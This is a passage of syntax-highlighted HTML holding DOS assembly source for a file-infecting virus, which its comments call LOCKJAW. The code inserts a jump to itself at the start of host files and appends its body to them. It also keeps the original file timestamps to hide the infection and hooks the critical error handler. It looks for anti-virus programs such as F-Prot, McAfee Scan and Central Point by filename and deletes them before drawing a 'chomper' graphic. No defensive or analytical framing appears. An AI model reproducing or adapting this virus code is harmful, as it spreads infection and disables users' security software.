        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">save_date</span><span class="sc0">                
                         
        
</span><span class="sc5">get_len</span><span class="sc4">:</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                 
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">move_pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                 
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">move_pointer</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                   
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">len_file</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
           
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_jmp</span><span class="sc0">             </span><span class="sc1">; write the jump to the virus</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_virus</span><span class="sc0">           </span><span class="sc1">; at the head of the host                        </span><span class="sc0">
                          </span><span class="sc1">; write the remainder of the   </span><span class="sc0">
</span><span class="sc5">save_date</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; virus to the end of the file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                       
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">handle</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">date</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">time</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">

</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">     
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">handle</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03eh</span><span class="sc0">                    
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_24h</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">          
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_24h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">notforme</span><span class="sc0">         
</span><span class="sc5">new_24h</span><span class="sc4">:</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            
        </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">the_stinger</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">; detection of anti-virus against defaults</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'MI'</span><span class="sc0">    </span><span class="sc1">;Integrity Master</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jumptoass</span><span class="sc0">                
        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'XR'</span><span class="sc0">    </span><span class="sc1">;*rx = VIREX</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jumptoass</span><span class="sc0">                
        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'PO'</span><span class="sc0">    </span><span class="sc1">;*STOP = VIRSTOP</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next1</span><span class="sc0">                     
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'TS'</span><span class="sc0">   
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jumptoass</span><span class="sc0">                

</span><span class="sc5">next1</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'VA'</span><span class="sc0">    </span><span class="sc1">;AV  = cpav</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jumptoass</span><span class="sc0">                  </span><span class="sc1">;Central Point     </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'TO'</span><span class="sc0">    </span><span class="sc1">;*prot = F-prot</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next2</span><span class="sc0">                
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'RP'</span><span class="sc0">  
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jumptoass</span><span class="sc0">                     

</span><span class="sc5">next2</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'NA'</span><span class="sc0">    </span><span class="sc1">;*scan =  McAfee's Scan.</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next3</span><span class="sc0">                
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'CS'</span><span class="sc0">  
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jumptoass</span><span class="sc0">                     
        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'NA'</span><span class="sc0">    </span><span class="sc1">;*lean = CLEAN.</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next3</span><span class="sc0">                      </span><span class="sc1">; why not, eh?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'EL'</span><span class="sc0">  
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jumptoass</span><span class="sc0">                     
</span><span class="sc5">next3</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">ret</span><span class="sc0">                
</span><span class="sc5">jumptoass</span><span class="sc4">:</span><span class="sc0">      
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Asshole_det</span><span class="sc0">                </span><span class="sc1">;Asshole Program                                      </span><span class="sc0">
                           </span><span class="sc1">;Detected, delete</span><span class="sc0">
</span><span class="sc5">move_pointer</span><span class="sc4">:</span><span class="sc0">   
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">handle</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
                        
</span><span class="sc5">write_jmp</span><span class="sc4">:</span><span class="sc0">      
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                    
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">         </span><span class="sc1">; move pointer to beginning of host</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">move_pointer</span><span class="sc0">     </span><span class="sc1">; do it, as in move_pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">           </span><span class="sc1">; write</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">           </span><span class="sc1">; a byte</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">jump</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; of the jump to LOCKJAW code</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">            </span><span class="sc1">; out to the host</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">           </span><span class="sc1">; reset the pointer </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">           
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">len_file</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">           </span><span class="sc1">; write the virus's recognition</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">           </span><span class="sc1">; intials out to the host</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">initials</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">write_virus</span><span class="sc4">:</span><span class="sc0">    
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">       
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">move_pointer</span><span class="sc0">   </span><span class="sc1">; move the pointer to end of host</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">      </span><span class="sc1">; write-to-file function</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">len</span><span class="sc0">     </span><span class="sc1">; length of virus in cx </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">      
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">get_date</span><span class="sc4">:</span><span class="sc0">       
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">           </span><span class="sc1">; get date/time stamps oh host</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">              </span><span class="sc1">; stash them in buffers</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">date</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">        </span><span class="sc1">;&lt;-----</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">time</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">;&lt;-----</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
                     
</span><span class="sc5">Grab_24</span><span class="sc4">:</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">              </span><span class="sc1">; set up critical error handler</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_24h</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_24h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_24h</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">            </span><span class="sc1">; revector error handler to virus</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">        
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">set_attrib</span><span class="sc4">:</span><span class="sc0">  
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">             </span><span class="sc1">; retrieve file attributes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_seg</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_off</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc0">                
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">               
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Asshole_det</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_seg</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; the anti-virus file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_off</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">                    </span><span class="sc1">; clear attributes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">            
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">                      </span><span class="sc1">; delete it</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
</span><span class="sc5">chomp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                           </span><span class="sc1">; da chomper visual</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">c1</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">                   </span><span class="sc1">; save cursor </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">c2</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">c3</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">c4</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">c5</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                    
                           
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">                 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">                 
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                    
                           
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                    
                           
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">eyes</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">          </span><span class="sc1">; print the eyes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">                    
                           
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                    
                           
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DCh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                    
                           
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                    
                           
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                    
                           
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">chomp_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                    
                           
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">55h</span><span class="sc0">                 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
